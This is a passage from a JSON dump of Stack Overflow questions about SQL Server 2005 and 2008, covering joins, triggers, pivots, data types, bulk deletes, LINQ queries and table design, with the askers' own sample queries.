'B9872','B2090','B9803','B9803','B9803','B10004','B10004')\n</code></pre>\n\n<p>Here is the table with which I ve to join:</p>\n\n<pre><code>     while(@loop_var&lt;=@count_var)\n        begin\n\n       select                  t.categ,Retail_RDR=w1.CMValue,Avg_Price_RDR=w2.CMValue,\n        GPVR_RDR=w3.CMValue,L_RDR=w4.CMValue,\n    from westernunion  w1 join #temp_financials t on     \n    w1.acct_no=t.retail_RDR left  outer join \n        westernunion  w2 on   w2.acct_no=t.avg_price_rdr \n        left outer join westernunion  w3 on  w3.acct_no=t.GPVR_RDR   \n        left outer join westernunion w4 on w4.acct_no=t.L_RDR \n        where        t.iden_val=@loop_var\n             set @loop_var=@loop_var+1\n          end\n</code></pre>\n"},{"tags":["sql-server-2005","delete","retrieve"],"answer_count":4,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":9624,"score":5,"question_id":3540729,"title":"How to recover deleted rows from SQL server table?","body":"<p>I accidentaly ran a DELETE command against a table with a wrong WHERE\nclause.</p>\n\n<p>I am using SQL Server 2005.</p>\n\n<p>Is there a way, or any utility software that could help me recover the\nlost data?</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":361,"score":1,"question_id":11150705,"title":"Single SQL Query to update datatypes of all columns in a table at one shot","body":"<p>I have a SQL Server table which has 625 columns created with different datatypes like <code>int</code>, <code>varchar(25)</code>, <code>decimal(18, 2)</code>, etc... </p>\n\n<p>Now am interested in changing datatype of all columns to <code>varchar(255)</code>. Instead of executing below query for all the columns one by one, is there a single SQL Server query to change datatypes of all columns in a table at one shot? </p>\n\n<pre><code>ALTER TABLE dbo.Employee \nALTER COLUMN FirstName VARCHAR(255) NOT NULL\n</code></pre>\n\n<p>Looking forward for your response.</p>\n"},{"tags":["sql-server-2005","join","count","group-by","distinct"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":43,"score":-1,"question_id":11130792,"title":"SQL Join the count to a query","body":"<p>I have created a database of my movies and another with my actors in each movie</p>\n\n<p>Columns are:</p>\n\n<ul>\n<li>ID</li>\n<li>Actor</li>\n<li>ImdbActorID</li>\n<li>ImdbMovieID</li>\n<li>Character\n<br/></li>\n</ul>\n\n<p>Example:<br/></p>\n\n<p>47105 | Howard McGillin | nm0569294 | tt0111333 | Adult Prince Derek <br/>\n47106 | Michelle Nicastro | nm0629264 | tt0111333 | Adult Princess Odette <br/>\n47108 | John Cleese | nm0000092 | tt0111333 | Jean-Bob<br/></p>\n\n<p>when my webapp queries a specific movie:\n<strong>Select * from actors where ImdbMovieID='tt0111333'</strong></p>\n\n<p>I get that list. What my problem is I would like to add a column of the total movies I have of each actor. so i don't programatically have to run a query for each actor</p>\n\n<p>I've thought of joining the same table to itself with the count??? but I don't know if that will even work. what stumps me is having that where clause.</p>\n\n<p>Thanks in advanced</p>\n"},{"tags":["sql","sql-server-2008","sql-server-2005","sql-server-2012"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":102,"score":1,"question_id":11131501,"title":"How to create a dynamic INNER JOIN","body":"<p>I need to create dynamic INNER JOIN (I believe I need to anyway). I have 4 tables pears, apples, oranges, bananas. I used all the same column names in those 4 tables.</p>\n\n<p>Another 2 tables 'fruit' and 'fruitcomments'</p>\n\n<pre><code>pears    apples    oranges   bananas\n-------------------------------------\nid\nuser\nphoto\ncomment\ndate\n</code></pre>\n\n<p>For the Fruits table typeid relates to other tables 1=pear, 2=apples, 3=oranges, 4=banana.\nItemid correlates to the id of either pears, apples, oranges or bananas.</p>\n\n<pre><code>Fruit \n-----------------------------------------------------------------------------\nfruitsid\ntypeid\nitemid\n</code></pre>\n\n<p>How would I go about selecting the top 10 from the fruit table and dynamically get the matching row from the corresponding table</p>\n\n<p>Working Code</p>\n\n<pre><code>SELECT TOP (10) fruitId, id, user, photo, comment FROM \n(\n    SELECT T1.fruitsId, T2.id, T2.user, T2.photo, T2.comment \n    FROM FRUITS T1 LEFT JOIN PEARS T2 ON (T1.itemId=T2.id)\n    WHERE T1.typeId=1\nUNION ALL\n    SELECT T1.fruitsId, T2.id, T2.user, T2.photo, T2.comment \n    FROM FRUITS T1 LEFT JOIN APPLES T2 ON (T1.itemId=T2.id)\n    WHERE T1.typeId=2\nUNION ALL\n    SELECT T1.fruitsId, T2.id, T2.user, T2.photo, T2.comment \n    FROM FRUITS T1 LEFT JOIN ORANGES T2 ON (T1.itemId=T2.id)\n    WHERE T1.typeId=3\nUNION ALL \n    SELECT T1.fruitsId, T2.id, T2.user, T2.photo, T2.comment \n    FROM FRUITS T1 LEFT JOIN BANANAS T2 ON (T1.itemId=T2.id)\n    WHERE T1.typeId=4\n)a\nORDER BY fruitId DESC\n</code></pre>\n\n<p>OLD NON-Working Code:</p>\n\n<pre><code>SELECT TOP (10) id, user, photo, comment FROM\n(\n\nSELECT f.typeid, f.itemid, a.id, a.user, a.photo, a.comment FROM Fruit f INNER JOIN a on f.item=a.id\n\n--excuse the gibberish. I never used CASE before\ncase when f.typeid=1 then\n(SELECT id, user, photo, comment FROM Pears WHERE id=f.itemid)a\ncase when f.typeid=2 then\n(SELECT id, user, photo, comment FROM Apples WHERE id=f.itemid)a\ncase when f.typeid=3 then\n(SELECT id, user, photo, comment FROM Oranges WHERE id=f.itemid)a\ncase when f.typeid=4 then\n(SELECT id, user, photo, comment FROM Bananas WHERE id=f.itemid)a\n)\n</code></pre>\n\n<p>Something like that, but I dont know how to express it correctly. Expected results below by selecting top (3) from following 'fruit' table order by fruitsid DESC.</p>\n\n<pre><code>fruits\n-----------\nfruitsid   typeid     itemid\n22         1          19\n23         3          73\n24         2          46\n\npears\n--------------\nid     user     photo    comment    date\n19     tom      1.jpg    hi         2012-06-01 12:00:00.000\n22     bill     5.jpg    hello      2012-06-01 13:00:00.000\n\napples\n--------------\nid     user     photo    comment\n46     sam      78.jpg   howdy\n22     bill     5.jpg    hello\n\nbananas\n--------------\nid     user     photo    comment\n32     tom      1.jpg    hi\n73     bill     5.jpg    hello\n\noranges\n--------------\nid     user     photo    comment\n73     jane     55.jpg   wave\n22     bill     5.jpg    hello\n\nresults\n-------------\n19     tom      1.jpg    hi \n73     bill     5.jpg    hello\n46     sam      78.jpg   howdy\n</code></pre>\n\n<p>IO Stats on 4 rows using UNION ALL with newer code</p>\n\n<pre><code>(4 row(s) affected)\nTable 'pears'. Scan count 1, logical reads 1, physical reads 0, read-ahead reads 0, lob logical reads 0, lob physical reads 0, lob read-ahead reads 0.\nTable 'fruit'. Scan count 3, logical reads 3, physical reads 0, read-ahead reads 0, lob logical reads 0, lob physical reads 0, lob read-ahead reads 0.\nTable 'apples'. Scan count 1, logical reads 16, physical reads 0, read-ahead reads 0, lob logical reads 0, lob physical reads 0, lob read-ahead reads 0.\nTable 'oranges'. Scan count 1, logical reads 115, physical reads 0, read-ahead reads 0, lob logical reads 0, lob physical reads 0, lob read-ahead reads 0.\n</code></pre>\n\n<p>At least there wasn't one physical read which is awesome</p>\n"},{"tags":["sql","sql-server","sql-server-2005","stored-procedures","udf"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":2821,"score":4,"question_id":6344880,"title":"Execute Stored Procedure from a Function","body":"<p>I know this has been asked to death, and I know why SQL Server doesn't let you do it.</p>\n\n<p>But is there any workaround for this, other than using Extended Stored Procedures?</p>\n\n<p>And please don't tell me to convert my function into a procedure...</p>\n\n<p>So what I'm really asking is: Is there ANY way to run a Stored Procedure from within a Function?</p>\n\n<p><strong>EDIT:</strong></p>\n\n<p>Point proven: there is a way around it, but it's so <strong>WRONG</strong> I wouldn't do it. \nI'm gonna change it to a Stored Procedure and execute it elsewhere.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","pivot"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":393,"score":2,"question_id":3765314,"title":"Sql Pivot top N rows only","body":"<p>I have Following structure</p>\n\n<pre><code>Col1 Col2 Col3  \n---------------\nF     P    R1\nF     P    R2\nF     P    R3\nF     P    R4\n</code></pre>\n\n<p>Col3 values can be any thing\nNow I want in following format only top 3 </p>\n\n<pre><code>Col1 Col2 Res1 Res2 Res3  \n------------------------------\nF     P    R1   R2   R3\n</code></pre>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":157,"score":2,"question_id":11131958,"title":"What is the maximum characters for the NVARCHAR(MAX)?","body":"<p>I have declared a column of type <code>NVARCHAR(MAX)</code> in SQL Server 2008, what would be its exact maximum characters having the MAX as the length?</p>\n"},{"tags":["query","sql-server-2005","duplicates"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":120,"score":1,"question_id":11136023,"title":"mssql, table contains duplicate row values for one column but its values for other coumn are diffrent, unique values of multiple entry?","body":"<p>i have a table a which have multiple entry of artikelNr for it to contain multiple Enhet values just like in the picture below, i would like to query all the unique artikelNr which are not associated with Enhet=5. any help on this, not getting any hint. asap.\nthere is another table which contains unique artikelNr only. if it can help. using mssql in my local database. </p>\n\n<pre><code>artikelNr enhet                      output should look like\n  1         0                        artikelnr          enhet \n  1         5                          2                 0 or 3  no problem\n  1         8                          6                 0 or 8 or 3 no problem \n  1         3\n  2         0\n  2         3 \n  4         5  \n  4         0  \n  4         1  \n  4         2\n  6         8\n  6         0\n  6         3\n  1         2  \n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":116,"score":1,"question_id":11135134,"title":"SQL Server boolean operators","body":"<p>I know that SQL Server does not have boolean data type and your best option is to use BIT data type.</p>\n\n<p>My question is to what boolean expressions evaluate. For example if I have the statement</p>\n\n<pre><code>expr1 AND expr2\n</code></pre>\n\n<p>and if expr1 is true and expr2 is false, do they internally evaluate to BITs with values 1 and 0? And then the AND operator checks for BITs?</p>\n\n<p>I think this is not the case because then the following should work:</p>\n\n<pre><code>select 1 where 1 and 0\n</code></pre>\n\n<p>So does sql server internally have a boolean data type?</p>\n\n<p>The following work</p>\n\n<pre><code>select 1 where 1 = 0\nselect 1 where 1 = 0 and 0 = 0\n</code></pre>\n\n<p>but this</p>\n\n<pre><code>select 1 where 1 and 0\n</code></pre>\n\n<p>reports</p>\n\n<p>Msg 4145, Level 15, State 1, Line 1\nAn expression of non-boolean type specified in a context where a condition is expected, near 'and'.</p>\n\n<p>which means that internally sql server handles the expressions as booleans, but why don't have access to that data type.</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005","linq-to-sql"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":170,"score":0,"question_id":11126873,"title":"Update Query with inner join ....?","body":"<p>I have this Table Named SubscriptionCharity, and its as the following :</p>\n\n<pre><code>SubscriptionId       ChannelURI       CharUserID\n1                       AX                12\n2                       ZA                7\n3                       AX                10\n</code></pre>\n\n<p>I want to to check for a specfic CharUserId if any record in the table with the same channel uri and set it to null , so in this table \"Subcriptionid =1 \" should be set to null</p>\n\n<p>I have two queries for this , one works in MS SQL Managment m but doesn't work with LINQ :\n(it doesn't affect the rows )</p>\n\n<pre><code>UPDATE SubscriptionCharProg \nSet ChannelURI = null \nFROM SubscriptionCharProg as t1\nINNER JOIN SubscriptionCharProg as t2 \n    on t1.ChannelURI = t2.ChannelURI \n    and t1.DeviceId = t2.DeviceId \nWHERE CharUserId! = 5\n</code></pre>\n\n<p>and Another One that works for LINQ but not with MS SQL Managment :\n(MS SQL Managment Error : Invalid Object Name \"t1\")</p>\n\n<pre><code>context.ExecuteStoreCommand(\"UPDATE t1 Set t1.ChannelURI = 1 FROM SubscriptionCharProg as t1 INNER JOIN  \n  SubscriptionCharProg as t2 on t1.ChannelURI = t2.ChannelURI WHERE t1.CharUserId! = \" \n  + charuserID + \"\", null);\n</code></pre>\n\n<p>Also , the main problem is , both queries nulls every channelURi Whether its equal or not</p>\n\n<p>Any ideas please?</p>\n\n<p>Edit : in case if the a record with a specific charuserID is exist twice or more it keeps and doesn't set it to null</p>\n"},{"tags":["sql","sql-server-2005","database-design"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":99,"score":1,"question_id":11127356,"title":"Add a SQL XOR Constraint between two nullable FK's","body":"<p>I'd like to define a constraint between two nullable FK's in a table where if one is null the other needs a value, but both can't be null and both can't have values. Logic is the derived table inherits data from the either of the FK tables to determine its type. Also, for fun bonus points, is this a bad idea?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":5298,"score":1,"question_id":3578742,"title":"How to move tables from one sql server database to another?","body":"<p>We have a database that has grown to about 50GB and we want to pull out a certain set of tables (about 20 of them) from within that database and move them into a new database.  All of this would be on the same SQL Server.  The tables that we want to pull out are about 12GB of space (6GB data, 6GB indexes).</p>\n\n<p>How can we move the tables from one database to the second but make sure the tables that are created in the new database are an exact copy of the originals (indexes, keys, etc.)?  Ideally I want a copy/paste from within SQL Server Management Studio but I know this does not exist, so what are my options?</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":11134179,"title":"SQL Server query based on record value","body":"<p>I have the following data structure:</p>\n\n<pre><code>P_ID    EVSSMIN EVSSMAX TDMIN   TDMAX   WARD    SYRINGE_ID   COMBINE_WITH   CUSTOM_CONCENTRATION\n1003    0   20  125 250 2ZKG    1021038\n    44444444    5\n1003    20  60  125 250 2ZKG    1021037\n    44444444    5\n</code></pre>\n\n<p>Normally I am using the following query for result.</p>\n\n<p>[QUERY 1]</p>\n\n<pre><code>SELECT * \nFROM [definities] \nWHERE 160 BETWEEN [TDMIN] AND [TDMAX] AND [WARD] = '2ZKG' AND [P_ID]=` 1003;\n</code></pre>\n\n<p>The last column in the table can contain a value higher then 0. Above it's 5.</p>\n\n<p>Normally I want to run the query below instead of the query above.</p>\n\n<p>[QUERY 2]</p>\n\n<pre><code>SELECT * FROM [definities] \nWHERE 160 BETWEEN [TDMIN] AND [TDMAX] \nAND CAST(160 as decimal) / [CUSTOM_CONCENTRATION]) BETWEEN EVSSMIN AND EVSMAX \nAND [WARD] = '2ZKG' -- AND [P_ID]= 1003;\n</code></pre>\n\n<p>As you can see the query is calculating the value 160 by dividing it with the [CUSTOM_CONCENTRATION]) value. Than it matches between the EVVSMIN and EVSSMAX and also the value 160 is matched between the TDMIN and TDMAX. Normally when the [CUSTOM_CONCENTRATION] column contains a value higer then 0 the query 2 will work properly. </p>\n\n<p>The problem is when the [CUSTOM_CONCENTRATION] column doesn't contain a value higher then 0 then the query can't return a record. This means that the query must be altered or something based on the [CUSTOM_CONCENTRATION] value. I can solve this within the C# code but the neat way is to able to do this as a query that returns me the exact record based on the values and not multiple records that I need to iterate and check it with if statements.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":11134145,"title":"Unexpected result on CAST or CONVERT in sql server","body":"<pre><code>SELECT CAST (330/60 AS FLOAT) AS result\n</code></pre>\n\n<p>or</p>\n\n<pre><code>SELECT CONVERT(FLOAT, 330/60) AS result\n</code></pre>\n\n<p>Actually I am expecting result as 5.5 </p>\n\n<p>But it is returning 5. <strong>Why?</strong></p>\n\n<p>And tell me any solution to get <strong>result as 5.5</strong></p>\n"},{"tags":["sql-server","sql-server-2005","insert","identity-column"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1327,"score":1,"question_id":11131520,"title":"Inserting a identity column value into another table","body":"<p>Good Morning. I have two tables, and one references the other. When I insert into the primary table, the primary key is auto-generated, viz Identity field. I need to insert this value into the second table. </p>\n\n<p>I found out using the OUTPUT clause will give me the just inserted identity value, ans so I tried this.</p>\n\n<pre><code>insert into owners (pId) \n   insert into personal (firstName) \n   output inserted.pId \n   values ('fn')\n</code></pre>\n\n<p>It doesn't work though. I get an error:</p>\n\n<blockquote>\n  <p>Incorrect syntax near the keyword 'insert'</p>\n</blockquote>\n\n<p>The personal table is the primary table, and the owners table contains the foreign key. \nHow can I do the required in SQL Server? </p>\n\n<p>I've got stuck-up here for the past two days...</p>\n"},{"tags":["sql-server-2005","sql-server-2008","comparison"],"answer_count":11,"favorite_count":36,"up_vote_count":57,"down_vote_count":2,"view_count":100619,"score":55,"question_id":198478,"title":"Advantages of SQL Server 2008 over SQL Server 2005?","body":"<p>What are the key differences between Microsoft's SQL Server 2005 and SQL Server 2008?  </p>\n\n<p>Are there any compelling reasons for upgrading (any edition, as I have a customer with multiple editions)? Or is there a website with either a chart or bullet point comparison of the two servers?</p>\n\n<p>Also, is there anything noteworthy in the <a href=\"http://en.wikipedia.org/wiki/SQL_Server_Express\">Express</a> editions of either version?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":222,"score":1,"question_id":11131701,"title":"trigger at particular column with condition","body":"<p>I want to check a Column value when update.If its match insert into another table.\nMy Tables:<img src=\"http://i.stack.imgur.com/KcmoC.png\" alt=\"FirstTable\"></p>\n\n<p><img src=\"http://i.stack.imgur.com/1Wxcu.png\" alt=\"SecondTable\"></p>\n\n<p>My trigger:<br></p>\n\n<pre><code>CREATE TRIGGER tr_test\nON test1\nFOR UPDATE\nAS\n    SET nocount ON\n\n    IF ( Update(sname) )\n      DECLARE @Name NVARCHAR\n\n    DECLARE @id INT\n\n    SET @id=@@IDENTITY \n    SET @Name=(SELECT sname\n               FROM   test1\n               WHERE  id = @id)\n\n    IF( @Name = 'Paras' )\n      BEGIN\n          INSERT INTO test2\n                      (loginfo)\n          VALUES     ('success')\n      END  \n</code></pre>\n\n<p>And my update query is:</p>\n\n<pre><code>update Test1 set Sname='Paras' where ID=1\n</code></pre>\n\n<p>When I run this update query Nothing is happen.<code>Test2</code> table is empty.I think problem is  <code>@@IDENTITY</code> but not sure.Thanks.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","ftp","xp-cmdshell"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":138,"score":2,"question_id":10308735,"title":"SQL Hangs on FTP Command but works off Command Line","body":"<p>SQL hangs on this command:</p>\n\n<pre><code>     EXEC master..xp_cmdshell 'ftp -s:C:\\FTP\\connect'\n</code></pre>\n\n<p>But doesn't hang on any other command I've tried using <code>xp_cmdshell</code> like <code>echo</code> <code>open</code> <code>get</code> and it works just fine, so I know the permissions for SQL Server to the Folder (and Download folder) are set properly.</p>\n\n<p>...And when <code>ftp -s:C:\\FTP\\connect</code> is executed on the command line, the FTP transfer begins, and completes successfully.  </p>\n\n<p>The SQL command that is giving issues on this particular server, worked completely fine on my other server.  I'm really not sure what else needs to be done.  Does anyone know why SQL hangs when I execute an FTP command besides anything else I've been through?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":6,"favorite_count":0,"up_vote_count":7,"down_vote_count":0,"view_count":811,"score":7,"question_id":2082751,"title":"How-To delete 8,500,000 Records from one table on sql server","body":"<pre><code>delete activities\nwhere unt_uid is null\n</code></pre>\n\n<p>would be the fastest way but nobody can access the database / table until this statement has finished so this is a no-go.</p>\n\n<p>I defined a cursor to get this task done during working time but anyway the impact to productivity is to big.\nSo how to delete these record so that the normal use of this database is guaranteed?</p>\n\n<p>It's a SQL-2005 Server on a 32-bit Win2003. Second Question is: How Long would you estimate for this job to be done (6 hours or 60 hours)? (Yes, i know that depends on the load but assume that this is a small-business environment)</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":685,"score":5,"question_id":2831034,"title":"Best optimizing for a large SQL Server table (100-200 Mil records)","body":"<p>What are the best options/recommendations and optimizations that can be performed when working with a large SQL Server 2005 table that contains anywhere from 100-200 Million records?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","getdate"],"answer_count":4,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":1240,"score":4,"question_id":8555316,"title":"Rounding SQL DateTime to midnight","body":"<p>I am having a small problem with my SQL query. I'm using the GETDATE function, however, let's say I execute the script at 5PM, it will pull up records between 12/12/2011 5PM to 12/18/2011 5PM. How can I make it pull up records for the whole entire 12/12/2011 - 12/18/2011 basically ignore time.</p>\n\n<p>My script:</p>\n\n<pre><code>WHERE Orders.OrderStatus = 'Shipped'  \nAND Orders.ShipDate &gt; (GETDATE()-6)  \n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":132,"score":0,"question_id":11128911,"title":"SQL query with start and end dates - what is the best option?","body":"<p>I am using MS SQL Server 2005 at work to build a database.  I have been told that most tables will hold 1,000,000 to 500,000,000 rows of data in the near future after it is built... I have not worked with datasets this large.  Most of the time I don't even know what I should be considering to figure out what the best answer might be for ways to set up schema, queries, stuff.   </p>\n\n<p>So... I need to know the start and end dates for something and a value that is associated with in ID during that time frame.  SO... we can the table up two different ways: </p>\n\n<pre><code>create table xxx_test2 (id int identity(1,1), groupid int, dt datetime, i int) \n\ncreate table xxx_test2 (id int identity(1,1), groupid int, start_dt datetime, end_dt datetime, i int) \n</code></pre>\n\n<p>Which is better?  How do I define better? I filled the first table with about 100,000 rows of data and it takes about 10-12 seconds to set up in the format of the second table depending on the query...</p>\n\n<pre><code>    select  y.groupid,\n            y.dt as [start], \n            z.dt as [end],   \n            (case when z.dt is null then 1 else 0 end) as latest, \n            y.i \n    from    #x as y \n            outer apply (select top 1 * \n                            from    #x as x \n                            where   x.groupid = y.groupid and \n                                    x.dt &gt; y.dt \n                            order by x.dt asc) as z         \n</code></pre>\n\n<p>or<br>\n<a href=\"http://consultingblogs.emc.com/jamiethomson/archive/2005/01/10/t-sql-deriving-start-and-end-date-from-a-single-effective-date.aspx\" rel=\"nofollow\">http://consultingblogs.emc.com/jamiethomson/archive/2005/01/10/t-sql-deriving-start-and-end-date-from-a-single-effective-date.aspx</a></p>\n\n<p>Buuuuut... with the second table.... to insert a new row, I have to go look and see if there is a previous row and then if so update its end date.  So... is it a question of performance when retrieving data vs insert/update things?  It seems silly to store that end date twice but maybe...... not?  What things should I be looking at? </p>\n\n<p>this is what i used to generate my fake data... if you want to play with it for some reason (if you change the maximum of the random number to something higher it will generate the fake stuff a lot faster):</p>\n\n<pre><code>declare @dt datetime\ndeclare @i int\ndeclare @id int\nset @id = 1\ndeclare @rowcount int\nset @rowcount = 0\ndeclare @numrows int \n\nwhile (@rowcount&lt;100000)\nbegin\n\nset @i = 1\nset @dt = getdate()\nset @numrows = Cast(((5 + 1) - 1) * \n                Rand() + 1 As tinyint)\n\nwhile @i&lt;=@numrows\n    begin\n    insert into #x values (@id, dateadd(d,@i,@dt), @i)\n    set @i = @i + 1\n    end \n\nset @rowcount = @rowcount + @numrows\nset @id = @id + 1\nprint @rowcount\nend \n</code></pre>\n"},{"tags":["php","mysql","sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":30,"score":-1,"question_id":10393748,"title":"About mysql views, relationship and any other related column to column thing","body":"<p>Guys can you suggest me any <strong>software</strong> who have some similarities with </p>\n\n<p><strong>Microsoft's SQL SERVER</strong></p>\n\n<p>I want to use the view part of SQL SERVER. <strong>To make it clear,</strong> I'm using <strong>MYSQL</strong> as back end so I wonder if there's something similar functionality with <strong>SQL SERVER</strong> for <strong>MY SQL</strong></p>\n\n<p>I mean this one: </p>\n\n<p><img src=\"http://i.stack.imgur.com/6CNhU.png\" alt=\"SQL SERVER's VIEW for MYSQL\"></p>\n\n<blockquote>\n  <p>Does mysql have this kind of functionality? If yes, what is it? If no,\n  can sql server support or can be used as mysql? How?</p>\n</blockquote>\n\n<p><strong>Please don't give me links I wanna learn not through a lot of links. Thank you so much guys... :)</strong></p>\n"},{"tags":["sql","sql-server","sql-server-2005","performance","aggregate"],"answer_count":3,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":2551,"score":6,"question_id":1747990,"title":"Performance of COUNT SQL function","body":"<p>I have two choices when writing an SQL statement with the <code>COUNT</code> function.</p>\n\n<ol>\n<li><code>SELECT COUNT(*) FROM &lt;table_name&gt;</code></li>\n<li><code>SELECT COUNT(some_column_name) FROM &lt;table_name&gt;</code></li>\n</ol>\n\n<p>In terms of performance, what is the best SQL statement?\nCan I obtain some performance gain by using option 1?</p>\n"},{"tags":["sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":200,"score":0,"question_id":11113723,"title":"How to show multiple row values in comma separated in a single row in sql server 2005?","body":"<p>Below I have shown two tables and also the result table.</p>\n\n<p><img src=\"http://i.stack.imgur.com/MlYky.png\" alt=\"enter image description here\"></p>\n\n<p>So please help me out how to get the result table in this manner as I shown on above.</p>\n\n<p>Thanks in advance...</p>\n"},{"tags":["asp.net","entity-framework","sql-server-2005","linq-to-entities"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":153,"score":0,"question_id":11125521,"title":"LINQ to entities performance regarding where clause","body":"<p>Let's say i have a table in a database with 10k records. I dont need to actually use those 10k records anymore, but i still need to keep them in the database. That very table is now going to be used to store new data. So there's gonna be more records coming on top of the 10K records already present in the table. As opposed to the \"old\" 10K records, i do need to work with the newly inserted data. Right now im doing this to get the data i need:</p>\n\n<pre><code>List&lt;Stuff&gt; l = (from x in db.Table\n            where x.id &gt; id\n            select x).ToList();\n</code></pre>\n\n<p>My question now is: <strong>how does the <code>where</code> clause in LINQ (or in SQL in general) work under the covers?</strong> Is the ENTIRE table going to be searched until <code>(x.id &gt; id)</code> is true? Because let's say the table will increase from 10k records to 20K. It'd be a little silly to look through the entire 20 k records, if i <strong>know</strong> that i only have to start looking from a certain point. </p>\n\n<p>I've had performance problems (not dramatic, but bad enough to be agitated by it) with this while using LINQ to entities, which i kinda don't understand because it should be no problem at all for a modern computer to sift through a mere 20 k records. I've been advised to use a stored procedure instead of a LINQ query, but i dont know whether or not this will boost performance? </p>\n\n<p>Any feedback will be appreciated.</p>\n"},{"tags":["sql","sql-server-2005","merge-replication"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":27,"score":1,"question_id":11090512,"title":"Merge replication commands being executed for a particular table","body":"<p>Is there a table where I can view the merge replication commands being executed for a particular table? Thank you</p>\n"},{"tags":["c#","asp.net","sql","sql-server-2005","linq-to-sql"],"answer_count":1,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":316,"score":1,"question_id":11120756,"title":"Most efficient way to query a large amount of data using C# and Linq","body":"<p>I have a web application (ASP.NET 4.0 in c#) and I am building a pseudo Adhoc component.  This component allows the user to select from a list of predetermined categories (Car Make, Care Model, Car Accessories, etc).  The user can select as many categories as they wish and then they press a \"Filter\" button which will take the categories that are selected and send them to a new form with the options of each category.  Each category can have multiple options.</p>\n\n<p>Example:\nUser selects Car Color, Car accessories.</p>\n\n<p>Filter page shows a form with a drop down pre-populated with colors for Car Color.  Form shows a check box for Satellite Radio, another check box for Leather Interior, etc.  All of these values are predefined.  Once a user specifies all of the items they can filter upon, I am using Linq to query the database.  As it is now, the Linq query is against a View that currently holds 14 Left Outer Joins and, if not filtered at all, returns over 30,000 rows.</p>\n\n<p>I am using dynamic linq to query to database link so:</p>\n\n<pre><code>var data = CMS.Model.Adhoc.GetData().AsQueryable(); //must be AsQueryablefor Dynamic Linq to function\n\n    public static List&lt;ViewADHOCContractInfo&gt; GetData()\n    {\n        PortalDataContext db = new PortalDataContext(AuthenticatedUser.ConnectionString);\n\n        return db.ViewADHOCInfos.Select(x=&gt;x).Distinct().ToList();\n    }\n</code></pre>\n\n<p>NOTE that GetData() is returning all rows and all columns of the result set, which I do not think is the most efficient way to do this, more on that at the bottom.</p>\n\n<p>From there I am performing a FOREACH statement on the filters that were sent in, and minimizing the result set on each iteration like so (abbreviated):</p>\n\n<pre><code>foreach (Filters filter in filters.OrderBy(x=&gt;x.strOrderNumber))\n        {\n            SanatizeFilter(filter.strFilter,filter);\n            if (filter.strValue != string.Empty &amp;&amp; filter.strValue != null)\n            {\n                if (filter.strOperator == \"Contains\")\n                {\n                    data = data.Where(filter.strFilter + \"!= NULL and \" + filter.strFilter + \".Contains(@0)\", filter.strValue).\n                        Select(x =&gt; x).ToList().AsQueryable();\n                }\n                else\n                {\n                    data = data.Where(filter.strFilter + FormatOperator(filter.strOperator) + \"@0\", filter.strValue).\n                        Select(x =&gt; x).ToList().AsQueryable();\n\n\n                }\n            }\n        }\n</code></pre>\n\n<p>All of this works fine, however it is slow.  My first question is, how can I use Linq to cut this down a bit.  I have tried a few ways to pull only the data that comes from the filter into the variable \"data\" as a way to pre-populate, however I can't get that to work with the .AsQueryable().  I would like to be able to get the column identifiers from the filter objects and select only those from the database so that I don't have to deal with all of the overhead, but I can't find a solution that will allow me to do this, any ideas?</p>\n\n<p>Second Question is right now this is all in a view in the database, would it be faster/more efficient to move it to a function or a stored procedure?  Can Linq interact with a stored procedure?</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":18864,"score":5,"question_id":2523676,"title":"Alter table add multiple columns ms sql","body":"<p>Can anyone tell me where is the mistake in the following query</p>\n\n<pre><code>ALTER TABLE Countries\nADD ( \nHasPhotoInReadyStorage  bit,\n 